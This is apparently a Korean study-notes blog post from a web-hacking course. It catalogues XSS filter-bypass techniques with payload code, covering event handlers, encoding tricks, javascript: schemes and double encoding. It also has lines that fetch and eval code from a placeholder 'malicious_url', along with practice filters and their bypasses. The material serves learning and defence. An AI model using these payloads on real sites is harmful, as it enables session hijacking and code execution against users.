---
title: '[Study] XSS Filtering Bypass'
date: 2023-01-23 00:00:00
categories: [Study, Web Hacking]
tags: [xss]
---

> 💡 [Dreamhack] Web Hacking Advanced - Client Side - XSS Filterfing Bypass I, II를 공부하며 정리하였습니다.
{: .prompt-info }

<br>

# #1. 이벤트 핸들러 속성

---

태그의 속성 값으로 스크립트를 포함할 수 있는 경우가 존재한다. 대표적으로 
**이벤트 핸들러**를 지정하는 `on`으로 시작하는 속성들이 존재한다. 이벤트 핸들러란 특정 요소에서 발생하는 이벤트를 처리하기 위해 존재하는 콜백 형태의 핸들러 함수이다.

자주 사용되는 이벤트 핸들러 속성: `onload`, `onerror`, `onfocus`

<br>

### onerror 이벤트 핸들러
```html
<!-- 이미지 로드 성공 > onerror 핸들러 실행X -->
<img src="valid" onerror="alert(1)">

<!-- 이미지 로드 실패 > onerror 핸들러 실행 -->
<img src="invalid" onerror="alert(1)">
```

<br>

### onfocus 이벤트 핸들러
```html
<!-- autofocus 속성을  주어 자동으로 포커스를 시킴 -->
<input id="inputBox" onfocus="alert(1)" autofocus>

<!-- id 값을 주어 URL의 hash(/#inputBox) 부분에 id 값을 입력하여 포커스 되도록 설정. -->
<input id="inputBox" onfocus="alert(1)">
```

<br>


# #2. 문자열 치환

---

XSS 키워드를 필터링할 때 문자열을 단순히 치환하거나 제거하는 방식도 사용되곤 한다.
<u>단순히 의심되는 구문을 제거할 경우 필터링되는 키워드 사이에 새로운 필터링 키워드를 삽입하는 방식으로 우회 가능하다.</u>

### 문자열 치환 우회
```javascript
/* 필터링 함수 */
function XSSFilter(data){
  return data.replace(/script/gi, '');
}
```
```html
<!-- 키워드를 중첩 삽입하여 우회 -->
<sscriptcript>alert(1)</sscriptcript>
```

<br>


# #3. 활성 하이퍼링크

---

HTML 마크업에서 사용될 수 있는 URL은 활성 콘텐츠를 포함할 수 있다. `javascript:` 스키마는 URL 로드 시 자바스크립트 코드를 실행할 수 있도록 한다.

### URL 스키마
다음과 같이 `a` 태그나 `iframe` 태그에서 URL 속성에 스키마를 사용할 수 있다.
```html
<a href="javascript:alert(1)"></a>
<iframe src="javascript:alert(1)">
```

<br>

### 정규화 우회
이를 방지하고자 XSS 키워드를 필터링할 때 `javascript:` 스키마를 필터링하는 경우가 존재하는데, 이는 정규화를 이용하여 우회할 수 있는 경우가 존재한다. 정규화 과정에서 `\x01`, `\x04`, `\t`와 같은 특수 문자들이 제거되고, 스키마의 대소문자가 통일된다.
```html
<a href="\1\4jAVasC\triPT:alert(1)"></a>
<iframe src="\1\4jAVasC\triPT:alert(1)">
```

<br>

### HTML Entity Encoding
HTML 태그 속성 내에서는 HTML Entity Encoding을 사용할 수 있다. 이를 이용하여 `javascript:` 스키마나 XSS 키워드를 인코딩하여 필터링을 우회할 수도 있다.
```html
<a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(1)"></a>
<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(1)">
```

<br>

+) URL 정규화 테스트
자바스크립트에서는 `URL` 객체를 통해 URL을 직접 정규화할 수 있으며, `protocol`, `hostname` 등 URL의 각종 정보를 추출할 수 있다.
```javascript
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}
normalizeURL('\4\4jAva\tScRIpT:alert(1)')
--> "javascript:alert"
```

<br>


# #4. 태그와 속성 기반 필터링

---

### 대소문자 인식 필터
대소문자를 모두 검사하지 않을 경우 다음과 같이 우회 가능하다.
```html
<sCript>alert(1)</scRIPT>
```

<br>

### 특정 태그 및 속성 필터
`script`, `img`, `input`과 같은 태그를 필터링 할 때, 다른 태그를 사용해 공격을 시도할 수 있다.
```html
<video><source onerror="alert(1)"/></video>
<body onload="alert(1)"/>
```

<br>

`on` 이벤트 핸들러를 필터링하고, 멀티 라인을 지원하는 문자를 검사할 때, 새로운 inner frame을 생성하는 `iframe` 태그를 이용해 우회할 수 있다.
```html
<!-- src 속성에서 활성 하이퍼링크 이용 -->
<iframe src="javascript:alert(1)">
  
<!-- srcdoc 속성을 이용 -->
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
```
위에서 `srcdoc` 속성을 이용하여 inner frame 내에 새로운 XSS 공격 코드를 입력할 수 있는데 이때, HTML 속성 내에 들어가기에 HTML Entity Encoding으로 기존 필터링을 우회하는 것이 가능하다.
`parent.alert`를 호출하는 이유는 스크립트가 호출되는 영역의 상위 문서에 존재하는 alert를 호출 해야하기 때문이다.

<br>


# #5. 자바스크립트 함수 및 키워드 필터링

---

### Unicode escape sequence
자바스크립트는 **Unicode escape sequence**를 지원한다. 이를 이용하여 필터링 된 문자열을 우회하는 것이 가능하다.
(Unicode escape sequence는 `\uAC00` == `가`와 같이 문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있는 표기법)

```javascript
"\u0063ookie" // cookie
"cooki\x65"   // cookie
\u0061lert(1) // alert(1)
```

<br>

### Computed member access
자바스크립트는 **Computed member access**를 지원한다. Computed member access는 객체의 특정 속성에 접근할 때 속성 이름을 동적으로 계산하는 기능이다.

```javascript
document["coo"+"kie"] == document["cookie"] == document.cookie
```


<br>

🔻 XSS 공격에 흔히 사용되는 구문과 필터링 우회를 위해 사용될 수 있는 대체 예시

|구문|대체 구문|
|---|--------|
|`alert`, `XMLHttpRequest` 등 문서 최상위 객체 및 함수|`window['al'+'ert']`, `window['XMLHtt'+'pRequest']` 등 이름 끊어서 쓰기|
|`window`|`self`, `this`|
|`eval(code)`|`Function(code)()`|
|`Function`|`isNaN['constr'+'uctor']` 등 함수의 `constructor` 속성 접근|

<br>

### 문자열 선언
필터링 혹은 인코딩/디코딩의 이유로 특정 문자(`()`, `[]`, `"`, `'` ...)를 사용하지 못하는 경우에 해당 문자를 대체할 수 있는 방법들을 통해 우회하여 공격할 수 있다.

따옴표(`"`, `'`)가 필터링되어 있다면 **템플릿 리터럴(Template Literals)**을 사용할 수 있다. 백틱(\`)을 이용하여 선언할 수 있고, `${}` 표현식을 이용해 다른 변수나 식을 사용할 수 있다.
(템플릿 리터럴은 내장된 표현식을 허용하는 문자열 리터럴로, 여러 줄로 이뤄진 문자열과 문자를 보관하기 위한 기능으로 이용할 수 있다.)

<br>

1. **RegExp** 객체 사용하기

	RegExp 객체를 생성하고 객체의 패턴 부분을 가져옴으로써 문자열을 만들 수 있다.
	
    ```javascript
	var foo = /Hello World!/.source; // "Hello World!"
	var bar = /test !/ + [];         // "/test !/"
	```

2. **String.fromCharCode** 함수 사용

	`String.fromCharCode` 함수는 유니코드의 범위 중 파라미터로 전달된 수에 해당하는 문자를 반환한다.
    
    ```javascript
	var foo = String.fromCharCode(72, 101, 108, 108, 111); // "Hello"
	```
    
3. 기본 내장 함수나 객체의 문자를 사용하는 방법

	내장 함수나 객체를 `toString` 함수를 통해 문자열로 변경하면 형태가 문자열로 변환된다. 원하는 문자열을 만드는데 필요한 문자들을 한 글자씩 가져와 문자열을 만들 수 있다.
    
    ```javascript
	var baz = history.toString()[8] + // "H"
	(history+[])[9] + // "i"
	(URL+0)[12] + // "("
	(URL+0)[13]; // ")" ==> "Hi()"
	```
    
    - `history.toString()` : `"[object History]"` 문자열 반환
    - `URL.toString()` : `"function URL () { [native code] }"` 문자열 반환

4. 숫자 객체의 진법 변환
	
    10진수 숫자를 36진수로 변경하여 ASCII 영어 소문자 범위를 모두 생성할 수 있다. 이때, `E4X 연산자 ("..")`가 존재하는데, 주로 점 두개를 쓰거나 소수점으로 인식되지 않도록 공백과 점을 조합해 사용할 수 있다.
    
    ```javascript
	var foo = 29234652..toString(36); // "hello"
	var bar = 29234652 .toString(36); // "hello"
	```

<br>
    
### 함수 호출

일반적인 자바스크립트의 함수 호출 방법

```javascript
alert(1); // Parentheses
alert`1`; // Tagged Templates
```

소괄호와 백틱 문자가 모두 필터링 되어있는 경우, 다음과 같은 방법들로 우회할 수 있다.

1. **javascript 스키마**를 이용한 location 변경

	`javascript:` 스키마를 이용해 `location` 객체를 변조하는 방식으로 자바스크립트 코드 실행.
    
    ```javascript
	location = "javascript:alert\x281\x29;";
	location.href = "javascript:alert\u00281\u0029;";
	location['href'] = "javascript:alert\0501\051;";
    ```

2. **Symbol.hasInstance** 오버라이딩
	
	ECMAScript 6에 추가된 Symbol을 속성 명칭으로 사용할 수 있다. `0 instanceof C`를 연산할 때, `C`에 `Symbol.hasInstance` 속성에 함수가 있을 경우 메소드로 호출하여 `instanceof` 연산자의 결과 값으로 사용하게 된다. `instanceof`를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있다.
    
    ```javascript
	"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
	Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
	```

3. **document.body.innerHTML** 추가

	`document.body.innerHTML`에 코드를 추가할 경우 새로운 HTML 코드가 문서에 추가되고, 코드를 실행할 수 있다. 이때, `innerHTML`로 HTML 코드를 실행할 때에는 보안 상 `<script>` 태그를 삽입해도 실행되지 않는다. 따라서 이벤트 핸들러를 이용해 코드를 실행해야 한다.
    
    ```javascript
	document.body.innerHTML += "<img src=x: onerror=alert&#40;1&#41;>";
	documnet.body.innerHTML += "<body src=x: onload=alert&#40;1&#41;>";
	```

<br>


# #6. 더블 인코딩(Double Encoding)

---

입력 검증은 디코딩 등의 모든 전처리 작업을 마치고 수행해야 한다. 검증이 끝난 데이터를 디코딩하여 사용해서는 안된다.
웹 방화벽을 거쳐 애플리케이션으로 전달되는 웹 서버에서, 웹 방화벽으로부터 통과한 데이터를 다시 디코딩해서 사용하면 **[더블 인코딩](https://owasp.org/www-community/Double_Encoding)**으로 웹 방화벽의 검증을 쉽게 우회할 수 있다.

```
// Failed Request
POST /search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1

// Successful Request
POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
```

<br>


# #7. 길이 제한

---

삽입할 수 있는 코드의 길이가 제한되어 있는 경우, 다른 경로로 실행할 추가적인 코드(payload)를 URL fragment 등으로 삽입하고 본 코드를 실행하는 짧은 코드(launcher)를 사용할 수 있다.

### location.hash
Fragment로 스크립트를 넘겨주고 XSS 지점에서 `location.hash`로 fragment 부분을 추출하여 `eval()` 로 실행하는 기법이 흔히 사용된다.

```
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(1); 
```

<br>

### 외부 자원을 이용한 공격방식

```javascript
import('malicious_url');
```

```javascript
var e = document.createElement('script')
e.src = 'malicious_url';
document.appendChild(e);
```

```javascript
fetch('malicious_url').then(x=>eval(x.text()))
```


<br>


# #Practice

---

1. "alert", "window", "document" 필터링

	`alert(document.cookie)` 실행

	**Filtering function**
    ```javascript
	function XSSFilter(data){
  		if(/alert|window|document/.test(data)){
    		return false;
  		}
  		return true;
	}
	```
    
    **Bypass**
    ```javascript
	// 1) 유니코드 이용
	\u0061lert(\u0064ocument.cookie);
               
	// 2) this 키워드로 window 객체 접근
	this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
	```

<br>

2. 주요 키워드와 특수문자 필터링 

	`alert(document.cookie)` 실행

	**Filtering function**
    ```javascript
	function XSSFilter(data){
     	if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|constructor|[\-+\\<>{}=]/i.test(data)){
          return false;
  		}
  		return true;
	}
	```
    
    **Bypass**
    ```javascript
	// 1) decodeURI 함수 이용
	Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
      decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
               
	// 2) atob 함수 & constructor 속성 이용
	Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
	```
    
    - 1) URL Encoding은 하단의 사이트 참고
    	https://www.w3schools.com/tags/ref_urlencode.ASP
        https://onlineasciitools.com/url-encode-ascii
    - 2) Base64 값은 `btoa('string')` 함수 이용
    
    
    <br>
    
3. (, ), ", ', \` 필터링

	`alert(document.cookie)` 실행

	**Filtering function**
    ```javascript
	function XSSFilter(data){
     	if(/[()"'`]/.test(data)){
          return false;
  		}
  		return true;
	}
	```
    
    **Bypass**
    ```javascript
	// 1) RegExp & URL.toString & Symbol.hasInstance
	/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};

	// 2) javascript 스키마로 location 변경 & RegExp & URL.toString
	location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
	```